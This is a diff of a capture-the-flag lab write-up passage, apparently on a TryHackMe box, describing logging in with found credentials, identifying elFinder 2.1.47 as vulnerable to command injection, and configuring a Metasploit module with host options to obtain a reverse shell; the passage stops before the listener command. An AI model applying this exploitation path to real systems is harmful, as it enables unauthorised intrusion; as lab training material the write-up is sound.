@@ -28,7 +28,9 @@ After putting in jose and password123, we find **http://files.lookup.thm/**
 After some research and checking the version, we can determine that the version of elfinder running, **2.1.47** is susceptible to a PHP connector command injection, and there's one available in Metasploit (**exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection**), after setting up my options as so:
 
 LHOST: [Local-Host]
+
 RHOST: 10.66.144.55
+
 VHOST: files.lookup.thm
 
 I wanted a reverse shell so I ran this on my client to listen for a connection:
